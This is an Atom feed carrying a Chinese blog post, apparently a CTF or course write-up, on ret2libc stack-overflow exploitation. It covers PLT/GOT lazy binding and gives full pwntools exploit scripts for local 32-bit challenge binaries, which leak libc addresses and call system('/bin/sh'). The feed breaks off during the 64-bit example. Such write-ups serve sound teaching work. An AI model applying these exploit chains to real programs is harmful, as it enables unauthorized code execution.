<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LeonChow</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-09T10:25:13.102Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Chow</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwn-ret2libc</title>
    <link href="http://example.com/2025/06/08/pwn-ret2libc/"/>
    <id>http://example.com/2025/06/08/pwn-ret2libc/</id>
    <published>2025-06-08T04:35:43.000Z</published>
    <updated>2025-06-09T10:25:13.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn-ret2libc"><a href="#pwn-ret2libc" class="headerlink" title="pwn-ret2libc"></a>pwn-ret2libc</h1><blockquote><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>本文所针对的题目是ret2libc类的基本栈溢出问题。总结而言，要想实现ret2libc，有以下几个必要条件：</p><p><strong>1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。</strong></p><p><strong>2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。</strong></p><p>另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法：</p><p><strong>1.开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。</strong></p><p><strong>2.程序本身也没有像system(“&#x2F;bin&#x2F;sh”)这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。</strong></p><p><strong>3.程序中可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，需要我们在libc库中寻找。</strong></p><span id="more"></span><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>我们的目标是拿到shell，换言之就是，劫持二进制可执行文件的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。拆分这个目标，可以分为以下两个步骤：</p><p><strong>1.找到system()函数和&#x2F;bin&#x2F;sh字符串在libc中的地址。</strong></p><p><strong>2.劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。</strong></p><p>实现第二步不难，只要精巧合理地构造溢出，把main函数的返回地址覆盖为system()函数的地址，并合理实现传参即可。关键在于如何找到system()函数和”&#x2F;bin&#x2F;sh”字符串的地址。这两个关键地址都在libc库中，这就是这类题型被叫做ret2libc的原因。那么如何寻找libc中的system()函数和”&#x2F;bin&#x2F;sh”字符串呢？这里需要用到以下公式：</p><p><strong>函数的真实地址   &#x3D;   基地址   +   偏移地址</strong> </p><p>要牢牢记住我们的目标：找到system()函数和”&#x2F;bin&#x2F;sh”字符串的真实地址。下面我们对这个公式做一个解释：</p><p>偏移地址：libc是Linux新系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。换句话说，只要确定了libc库的版本，就可以确定其中system()函数、”&#x2F;bin&#x2F;sh”字符串的偏移地址。解题核心在于如何确定libc版本，本文介绍过程将忽略这个问题，打本地直接确定为本地的libc版本即可。</p><p>基地址：每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。然而，哪怕每次运行时函数的真实地址一直在变，最后三位确始终相同。可以根据这最后三位是什么确定这个函数的偏移地址，从而反向推断出libc的版本（此处需要用到工具LibcSearcher库，本文忽略这个步骤）。那么如何求基地址呢？如果我们可以知道一个函数的真实地址，用公式：</p><p>这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址</p><p>即可求出这次运行的基地址。 </p><p>这回问题又发生了转化：如何找到某个函数func的真实地址呢？</p><p>像puts(),write()这样的函数可以打印内容，我们可以直接利用这些打印函数，打印出某个函数的真实地址（即got表中存放的地址）。某个函数又指哪个函数呢？由于Linux的延迟绑定机制，我们必须选择一个main函数中已经执行过的函数（这样才能保证该函数在got表的地址可以被找到），选哪个都可以，当然也可以直接选puts和write，毕竟题目中像puts和write往往会直接出现在main函数中。</p><p>总结一下上面这段话，我们可以通过构造payload让程序执行puts(puts@got)或者write(1,write@got, 读取的字节数)打印puts函数&#x2F;write函数的真实地址。</p><p>整体思路总结（关键）：</p><p><code>1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。</code></p><p><code>2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。</code></p><p><code>3.根据libc库的版本可以很容易的确定puts函数的偏移地址。</code></p><p><code>4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。</code></p><p><code>5.根据libc函数的版本，很容易确定system函数和&quot;/bin/sh&quot;字符串在libc库中的偏移地址。 </code></p><p><code>6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和&quot;/bin/sh&quot;字符串的真实地址。</code></p><p><code>7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(&quot;/bin/sh&quot;)的真实地址，从而拿到shell。</code></p><h2 id="前置知识（简要了解）"><a href="#前置知识（简要了解）" class="headerlink" title="前置知识（简要了解）"></a>前置知识（简要了解）</h2><p>plt表和got表<br>这块不用理解太深，读者嫌麻烦也可以直接看后文的解题过程，我这里总结了几位大佬的博客，做个简要介绍。</p><p>由于二进制文件本身没有 system 也没有 &#x2F;bin&#x2F;sh，需要使用 libc 中的 system 和 &#x2F;bin&#x2F;sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc版本，从而知道其他函数的地址。获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址。为什么是已经执行过的函数的地址呢，此处就要介绍plt表和got表的内容了。</p><p>got表：globle offset table 全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址。我们的最终目标就是拿到system函数的got表地址，同时知道libc的基地址的话即可找到system函数的真实地址。</p><p>plt表：procedure link table 程序链接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量。可以理解为函数的入口地址，通过劫持返回地址为puts函数的plt表地址，即可执行puts函数。</p><p>说的有点绕，用大佬语雀博客中的一图以蔽之：<br><img src="/2025/06/08/pwn-ret2libc/image-20250608131129247.png" alt="image-20250608131129247"></p><p>可执行的二进制文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址（即最靠右的两个箭头已经建立），但是在一开始（尚未发生函数调用时）就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制。</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，上图中最右侧的两个箭头才建立完成，我们才能够通过got表读取到libc中的函数。至于具体过程相对复杂，这里引用大佬博主的图片简要介绍，当程序第一次执行某个函数A时，发生的过程如下：<br><img src="/2025/06/08/pwn-ret2libc/image-20250608131200240.png" alt="image-20250608131200240"></p><p>在可执行二进制程序调用函数A时，会先找到函数A对应的PLT表，PLT表中第一行指令则是找到函数A对应的GOT表。此时由于是程序第一次调用A，GOT表还未更新（就是图一中最右边俩箭头还没有建立），会先去公共PLT进行一番操作查找函数A的位置，找到A的位置后再更新A的GOT表，并调用函数A。当第二次执行函数A时，发生的流程就很简单了，如下图：<br><img src="/2025/06/08/pwn-ret2libc/image-20250608131221357.png" alt="image-20250608131221357"></p><p>此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用。说白了，图三就是图一。 </p><p>原文链接：<a href="https://blog.csdn.net/Bossfrank/article/details/134872403">https://blog.csdn.net/Bossfrank/article/details/134872403</a></p></blockquote><p>例题如下：</p><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><ol><li>拿到题目先查属性如图所示</li></ol><p><img src="/2025/06/08/pwn-ret2libc/image-20250609101918422.png" alt="image-20250609101918422"></p><ol start="2"><li>可以看到首先canary和PIE都没有找到但是开启了 NX 保护 那我们看下是否是静态链接的</li></ol><p><img src="/2025/06/08/pwn-ret2libc/image-20250609102020409.png" alt="image-20250609102020409"></p><ol start="3"><li>发现是动态链接 那就麻烦了 那我们打开IDA搜下 <code>systeam</code> 函数吧 发现并没有函数调用 但是我们在导入表里面发现到了 <code>system</code> 并且在全局字符串里面找到了 <code>/bin/sh</code> 那就好办了 我们可以去构造payload的了 如下所示</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_adr = e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bs = <span class="built_in">next</span>(e.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x8048689\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_adr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bs))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_adr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bs)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>代码解释如下 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.首先通过软件的 plt 动态链接表我们可以定位到系统函数<span class="string">&#x27;system&#x27;</span>处</span><br><span class="line">2.之后我们在此通过搜索软件的常量字符串拿到 <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">3.紧接着我们构造的payload原理是这样的 找到溢出点 更改ret的地址 之后 <span class="string">&#x27;构造system函数的栈帧&#x27;</span> 也就是从<span class="string">&#x27;高地址到低地址传递参数、返回值&#x27;</span> 但是我们不在乎他返回到哪里去 因为只要参数传递进去了 他就会执行从而帮我们拿到shell</span><br></pre></td></tr></table></figure><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><ol><li>先查属性</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc2 checksec ret2libc2 </span><br><span class="line">[*] <span class="string">&#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc2/ret2libc2&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><ol start="2"><li>开启了 NX 看是否是静态编译</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc2 file ret2libc2 </span><br><span class="line">ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped</span><br></pre></td></tr></table></figure><ol start="3"><li>发现不是 拖到ida我们可以分析出来他有system函数但是没有 <code>/bin/sh</code> 我们只能自已去构造 好消息是有一个 <code>gets</code> 函数 并且我们还在IDA里面发现了一个 <code>buf2</code> 他是基于bss段的 所以我们可以吧 <code>/bin/sh</code> 写到这里面 让我们的 <code>system</code> 函数去执行就可以了 exp如下所示</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x080486C5\nc&quot;)</span></span><br><span class="line"></span><br><span class="line">sys_adr  = <span class="number">0x08048490</span></span><br><span class="line">gets_adr = <span class="number">0x08048460</span></span><br><span class="line">bss_adr  = <span class="number">0x0804A080</span></span><br><span class="line">pop_ebp  = <span class="number">0x0804872f</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_adr, pop_ebp, bss_adr, sys_adr, <span class="number">0xdeadbeef</span>, bss_adr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ol start="4"><li>exp 解析如下所示</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.首先我们先从IDA中拿出 <span class="string">&#x27;system&#x27;</span> 的地址 以及 <span class="string">&#x27;gets&#x27;</span> 和 <span class="string">&#x27;bss&#x27;</span>的地址 </span><br><span class="line">2.然后我们构造栈内数据 那为什么我们需要一个 <span class="string">&#x27;pop_ebp&#x27;</span> 呢 </span><br><span class="line">3.其实主要是 <span class="string">&#x27;pop&#x27;</span> 不在乎 <span class="string">&#x27;pop&#x27;</span> 什么 前提是我们需要构造 <span class="string">&#x27;gets&#x27;</span> 的栈帧 </span><br><span class="line">4.但是在构造的过程中我们把 <span class="string">&#x27;bss&#x27;</span> 段的地址写在了栈内 让他当作参数执行 </span><br><span class="line">5.我们执行完之后如果不进行pop他就不会把参数弹出栈 </span><br><span class="line">6.他就会继续执行 他会以为 <span class="string">&#x27;bss&#x27;</span> 是一个函数地址 </span><br><span class="line">7.然后 <span class="string">&#x27;sys_adr&#x27;</span> 是返回值 <span class="string">&#x27;0xdeadbeef&#x27;</span> 是参数 会导致一系列的问题 </span><br><span class="line">8.保持栈结构正确，这样才能正常执行 <span class="string">&#x27;system(buf2)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><ol><li>首先查属性  NX开启</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 checksec ret2libc3</span><br><span class="line">[*] <span class="string">&#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc3/ret2libc3&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><ol start="2"><li>查看文件属性 动态编译 32bit</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 file ret2libc3</span><br><span class="line">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped</span><br></pre></td></tr></table></figure><ol start="3"><li>用ida打开发现有个gets 但是呢没有 <code>system</code> 也没有 <code>/bin/sh</code> 那我们只能去通过libc去计算他的值了 首先我们是本地测试 所以我们直接用一条指令查看他是那个 <code>libc</code> 文件即可</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 ldd ret2libc3</span><br><span class="line">        linux-gate.so.1 (0xf7f3e000)</span><br><span class="line">        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cf2000)</span><br><span class="line">        /lib/ld-linux.so.2 (0xf7f40000)</span><br></pre></td></tr></table></figure><ol start="4"><li>发现是 <code>/lib/i386-linux-gnu/libc.so.6</code> 那么我们待会就从这里面拿出即可 因为有个<code>gets</code>函数 所以计算偏移的事我们就不搞了 比较简单没什么可讲的</li><li>然后因为要计算 函数起始地址所以要用到以下指令 拿到程序入口地址为 0x80484d0</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 readelf -h ./ret2libc3</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           Intel 80386</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x80484d0</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          6436 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         9</span></span><br><span class="line"><span class="string">  Size of section headers:           40 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         35</span></span><br><span class="line"><span class="string">  Section header string table index: 32</span></span><br></pre></td></tr></table></figure><ol start="6"><li>之后我们可以去写 exp了如下所示</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2libc3&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;ret2libc3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#程序的起始地址</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, puts_plt, start_addr, puts_got]) </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])  <span class="comment">#接收puts的真实地址，占4个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt),<span class="built_in">hex</span>(puts_got), <span class="built_in">hex</span>(start_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr: &quot;</span>, <span class="built_in">hex</span>(puts_real_addr)) </span><br><span class="line"><span class="comment"># 计算 puts 在libc中的偏移值</span></span><br><span class="line">libc_puts_addr = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_puts_addr:&quot;</span>,<span class="built_in">hex</span>(libc_puts_addr))</span><br><span class="line"><span class="comment"># 计算libc的基地址 因为开启了 PIE所以每次都不一样 需要写在这里运行一次计算一次</span></span><br><span class="line">libc_real_addr = puts_real_addr -  libc_puts_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_real_addr:&quot;</span>,<span class="built_in">hex</span>(libc_real_addr))</span><br><span class="line"><span class="comment"># 计算 system 在libc中的偏移值</span></span><br><span class="line">libc_sys_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr = libc_real_addr + libc_sys_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr:&quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># 计算 /bin/sh 在libc中偏移量</span></span><br><span class="line">libc_bs_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">bs_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)) + libc_real_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_bs_addr:&quot;</span>,<span class="built_in">hex</span>(bs_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, sys_addr, <span class="number">0x11111111</span>, bs_addr])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="7"><li>exp 解释</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.我们现在知道 libc的版本所以直接用 <span class="string">&#x27;ELF()&#x27;</span> 的形式去加载他 后续我们需要获取<span class="string">&#x27;system&#x27;</span>的偏移以及<span class="string">&#x27;/bin/sh&#x27;</span>的偏移</span><br><span class="line">2.获取完程序本身的 <span class="string">&#x27;puts&#x27;</span> 函数的 <span class="string">&#x27;plt&#x27;</span> 表和 <span class="string">&#x27;got&#x27;</span>表 我们可以通过调用 <span class="string">&#x27;puts&#x27;</span> 函数的特性去把 <span class="string">&#x27;got&#x27;</span> 表的地址给他泄露出来 方便后续计算偏移 再加上linux的特性延迟导入 我们也必须先执行一遍 <span class="string">&#x27;puts&#x27;</span> 才会有 <span class="string">&#x27;got&#x27;</span> 表的初始化</span><br><span class="line">3.之后我们通过获取 <span class="string">&#x27;libc&#x27;</span> 里面的 <span class="string">&#x27;puts&#x27;</span> 函数 我们可以通过 <span class="string">&#x27;puts&#x27;</span> 在程序中的 <span class="string">&#x27;got&#x27;</span> 表的值去计算出 <span class="string">&#x27;libc&#x27;</span> 的基地址 毕竟全是依赖于这个库的</span><br><span class="line">4.既然拿到了基地址 那么 只需要获取 <span class="string">&#x27;system&#x27;</span> 的偏移不就可以计算出真正的 <span class="string">&#x27;system&#x27;</span> 函数的地址了 </span><br><span class="line">5.<span class="string">&#x27;bin/sh&#x27;</span>的获取方法也是同理</span><br><span class="line">6.接着构建栈帧发送<span class="string">&#x27;payload&#x27;</span>即可 因为我们上次<span class="string">&#x27;puts&#x27;</span>的返回地址是程序的入口 相当于又执行了一遍这个程序</span><br></pre></td></tr></table></figure><h2 id="ret2libc3-x64"><a href="#ret2libc3-x64" class="headerlink" title="ret2libc3_x64"></a>ret2libc3_x64</h2><ol><li>查属性 也是开启了 NX</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 checksec ret2libc_64</span><br><span class="line">[*] <span class="string">&#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc3/ret2libc_64&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><ol start="2"><li>查文件属性 动态编译</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 file ret2libc_64</span><br><span class="line">ret2libc_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60d15ef4be5c2352730bc0390234cd7780c0f138, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><ol start="3"><li>查文件入口 后续要用 或者直接在 gdb 里面 <code>info func</code> 也可以 一般就是 <code>_start</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 readelf -h ret2libc_64</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span 